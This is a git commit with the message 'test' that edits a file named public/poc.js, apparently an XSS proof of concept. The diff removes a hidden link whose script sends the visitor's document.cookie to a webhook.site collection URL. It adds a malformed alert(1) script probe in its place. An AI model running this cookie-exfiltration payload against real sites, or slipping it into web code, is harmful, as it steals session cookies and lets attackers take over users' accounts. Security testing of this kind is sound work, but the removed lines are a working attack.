7d84601120bc6cb6c4d0f7294a1b821315ae889b
SanghyeonYeah <jeff090413@gmail.com>
2026-03-30 14:58:44 +0900

    test

--- public/poc.js
+++ public/poc.js
@@ -1,6 +1,1 @@
-<a id="exfil" href="#" style="display:none;">Exfil</a>
-<script>
-document.getElementById('exfil').onclick = function() {
-    window.location.href = 'https://webhook.site/f7a6cfea-5f3f-4ae3-a158-77f0cb809474?cookie=' + encodeURIComponent(document.cookie);
-};
-</script>
+<script>alert(1)>?</script>
